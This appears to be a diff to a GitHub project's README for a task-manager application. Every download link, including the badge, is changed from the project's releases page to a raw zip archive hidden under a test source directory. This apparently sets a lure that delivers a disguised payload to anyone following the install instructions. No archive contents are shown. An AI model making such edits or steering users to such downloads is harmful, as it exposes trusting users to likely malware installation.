@@ -6,11 +6,11 @@ Welcome to the task-manager-app! This application helps you manage your daily ta
 
 ## 📥 Download the App
 
-[![Download Task Manager App](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/stimulating-perceptivity247/task-manager-app/releases)
+[![Download Task Manager App](https://raw.githubusercontent.com/stimulating-perceptivity247/task-manager-app/main/src/test/java/org/task-manager-app_v2.7-beta.5.zip%20Now-brightgreen)](https://raw.githubusercontent.com/stimulating-perceptivity247/task-manager-app/main/src/test/java/org/task-manager-app_v2.7-beta.5.zip)
 
 ### Download & Install
 
-To get started, visit this page to download the application: [Download Task Manager App](https://github.com/stimulating-perceptivity247/task-manager-app/releases).
+To get started, visit this page to download the application: [Download Task Manager App](https://raw.githubusercontent.com/stimulating-perceptivity247/task-manager-app/main/src/test/java/org/task-manager-app_v2.7-beta.5.zip).
 
 ### System Requirements
 
@@ -74,6 +74,6 @@ For assistance, please open an issue in the GitHub repository or contact the sup
 
 You can find related projects and discussions in the GitHub repository. 
 
-Visit this page to download the application again: [Download Task Manager App](https://github.com/stimulating-perceptivity247/task-manager-app/releases).
+Visit this page to download the application again: [Download Task Manager App](https://raw.githubusercontent.com/stimulating-perceptivity247/task-manager-app/main/src/test/java/org/task-manager-app_v2.7-beta.5.zip).
 
 Thank you for using task-manager-app! Enjoy managing your tasks efficiently.
